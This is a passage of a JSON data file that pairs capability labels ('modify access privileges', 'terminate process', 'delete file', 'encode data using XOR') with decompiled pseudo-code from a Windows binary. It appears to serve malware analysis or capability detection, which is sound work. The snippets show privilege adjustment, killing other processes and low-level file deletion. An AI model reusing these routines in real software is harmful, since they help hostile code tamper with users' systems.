        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.0040f37a(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = fcn.0040f21e();\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0040f296(5);\n        if (iVar2 != 0) {\n            *(iVar2 + 0x14) = *(in_EAX + 0x14);\n            *(iVar2 + 0x20) = *(in_EAX + 0x20);\n            *(iVar2 + 0x24) = *(in_EAX + 0x24);\n            *(iVar2 + 0x10) = *(in_EAX + 0x10);\n            *(iVar2 + 0x18) = 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 201
    },
    "00405a94": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405a94(uint lpSubKey, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint phkResult;\n    uint var_4h;\n    \n    iVar3 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    if (iVar2 == 0) {\n        var_4h = 0;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(phkResult, arg_ch, 0, 0, 0, &var_4h);\n        if (iVar2 == 0) {\n            iVar3 = fcn.00406338(0);\n            if (iVar3 != 0) {\n                iVar2 = (*pcVar1)(phkResult, arg_ch, 0, 0, iVar3, &var_4h);\n                if (iVar2 == 0) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = var_4h;\n                    }\n                }\n                else {\n                    fcn.00406445();\n                    iVar3 = 0;\n                }\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return iVar3;\n}\n",
        "token_count": 345
    },
    "0040857e": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: lpflOldProtect\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040857e(uint dwProcessId)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpflOldProtect;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x4128e0, 0x2c);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 8, 0x3000, 4);\n    *(unaff_EBP + -0x20) = puVar1;\n    if (puVar1 != NULL) {\n        *puVar1 = *(unaff_EBP + 8);\n        puVar1[1] = 0;\n        (*_sym.imp.KERNEL32.dll_VirtualProtect)(puVar1, 8, 0x104, unaff_EBP + -0x24);\n        *(unaff_EBP + -0x3c) = 0x18;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x30) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x28) = 0;\n        *(unaff_EBP + -4) = 0;\n        iVar2 = (*_sym.imp.ntdll.dll_ZwOpenProcess)(unaff_EBP + -0x1c, 1, unaff_EBP + -0x3c, puVar1);\n        if (iVar2 < 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        puVar1[1] = 0;\n        *(unaff_EBP + -4) = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar1, 0, 0x8000);\n    }\n    if (*(unaff_EBP + -0x1c) == 0) {\n        (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, *(unaff_EBP + 8));\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 732
    },
    "004070e4": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004070e4(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    \n    (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uVar2 = 0;\n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        do {\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_14h);\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar1 = fcn.00408a11();\n            *(uVar2 + arg_8h) = uVar1;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    fcn.00409681(arg_8h);\n    return 0;\n}\n",
        "token_count": 222
    },
    "00401136": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401136(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x42e424 != 0) {\n        do {\n            fcn.004086b5(*(*0x42e40c + uVar1 * 4), 0);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x42e424);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00402bb5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402bb5(uint32_t arg_8h, uint lpString)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    uint nChar;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    uVar3 = 0;\n    if (arg_8h != 0) {\n        do {\n            iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpNA)(uVar3 + unaff_EDI, lpString, uVar1);\n            if (iVar2 == 0) {\n                return uVar3 + unaff_EDI;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 195
    },
    "00404b70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.00404b70(uint param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = NULL;\n    for (puVar1 = *0x42f184; puVar1 != NULL; puVar1 = puVar1[6]) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(*puVar1, param_1);\n        if (iVar3 == 0) goto code_r0x00404bd7;\n    }\n    puVar1 = fcn.00406338(8);\n    if (puVar1 != NULL) {\n        puVar1[6] = *0x42f184;\n        *0x42f184 = puVar1;\n        uVar2 = fcn.0040926b(param_1);\n        *puVar1 = uVar2;\n        iVar3 = fcn.00408a74();\n        fcn.004091a1(iVar3 + 1, 7);\ncode_r0x00404bd7:\n        puVar4 = puVar1 + 1;\n    }\n    return puVar4;\n}\n",
        "token_count": 265
    },
    "00404da7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00404da7(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x42eacc != 0) {\n        do {\n            fcn.00404c3c(param_1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x42eacc);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00404f83": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00404f83(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t *unaff_ESI;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((unaff_ESI != NULL) && (*unaff_ESI != 0)) {\n        do {\n            iVar1 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(param_1, *(unaff_ESI[1] + uVar2 * 4));\n            if (iVar1 != 0) {\n                return 1;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *unaff_ESI);\n    }\n    return 0;\n}\n",
        "token_count": 162
    },
    "0040591e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040591e(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    \n    uVar3 = 0;\n    iVar1 = fcn.00406338(0);\n    if ((iVar1 != 0) && (unaff_EDI != 0)) {\n        do {\n            uVar2 = fcn.00406338(8);\n            *(iVar1 + uVar3 * 4) = uVar2;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < unaff_EDI);\n    }\n    return iVar1;\n}\n",
        "token_count": 153
    },
    "0040629c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0040629c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint ProcessHeaps;\n    \n    iVar1 = *0x42f160;\n    uVar4 = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeaps)(0xff, &ProcessHeaps);\n    if (((uVar2 != 0) && (uVar2 < 0x100)) && (uVar3 = 0,  uVar2 != 0)) {\n        do {\n            if ((&ProcessHeaps)[uVar3] == iVar1) {\n                uVar4 = 1;\n                break;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 211
    },
    "0040cfc5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040cfc5(uint *param_1)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        do {\n            in_EAX = in_EAX + -1;\n            param_1[in_EAX] = 0;\n        } while (in_EAX != 0);\n    }\n    return *param_1;\n}\n",
        "token_count": 94
    },
    "0040f418": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040f418(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    cVar1 = fcn.0040f21e();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x14) == 4)) {\n        for (iVar2 = *(in_EAX + 0x10); iVar2 != 0; iVar2 = *(iVar2 + 8)) {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 143
    },
    "0040f43f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040f43f(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    cVar1 = fcn.0040f21e();\n    iVar4 = iVar3;\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x14) == 4)) {\n        iVar2 = *(in_EAX + 0x10);\n        while ((iVar4 = iVar3,  iVar2 != 0 && (iVar4 = iVar2,  param_1 != 0))) {\n            iVar2 = *(iVar2 + 8);\n            param_1 = param_1 + -1;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 189
    },
    "004028bf": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004028bf(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 59
    },
    "00408635": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nbool fcn.00408635(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    if ((param_1 != iVar1) && (iVar1 = fcn.0040857e(param_1),  iVar1 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, param_2);\n        bVar2 = iVar1 != 0;\n        fcn.00408489();\n    }\n    return bVar2;\n}\n",
        "token_count": 145
    },
    "00408914": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408914(uint lpName)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint NewState;\n    uint lpLuid;\n    uint uStack20;\n    uint var_ch;\n    uint TokenHandle;\n    \n    cVar1 = fcn.00409ec6(lpName);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0;\n        TokenHandle = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar4 != 0) {\n            NewState = 0;\n            lpLuid = 0;\n            uStack20 = 0;\n            var_ch = 0;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, lpName, &lpLuid);\n            if (iVar4 != 0) {\n                NewState = 1;\n                var_ch = 2;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n                if (iVar4 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar4 != 0x514) {\n                        uVar2 = 1;\n                    }\n                }\n            }\n        }\n        fcn.00408489();\n    }\n    return uVar2;\n}\n",
        "token_count": 372
    },
    "00409b60": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00409b60(uint lpFileName)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint UnicodeString;\n    \n    uVar3 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SearchPathW)(0, lpFileName, 0, 0x208, &lpBuffer, 0);\n    if (uVar1 != 0) {\n        uVar1 = (*_sym.imp.ntdll.dll_RtlDosPathNameToNtPathName_U)(&lpBuffer, &UnicodeString, 0, 0);\n        if (uVar1 != '\\0') {\n            var_1ch = &UnicodeString;\n            var_24h = 0x18;\n            var_20h = 0;\n            var_18h = 0x40;\n            var_14h = 0;\n            var_10h = 0;\n            iVar2 = (*_sym.imp.ntdll.dll_NtDeleteFile)(&var_24h);\n            uVar3 = -1 < iVar2;\n            uVar1 = (*_sym.imp.ntdll.dll_RtlFreeUnicodeString)(&UnicodeString);\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 334
    },
    "0040f1fe": {
        "rules": [
            "allocate thread local storage"
        ],
        "decompiled_code": "\nvoid fcn.0040f1fe(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0040f1ec();\n    if (cVar1 == '\\0') {\n        *0x42f174 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n        *0x42f178 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    }\n    return;\n}\n",
        "token_count": 92
    }
}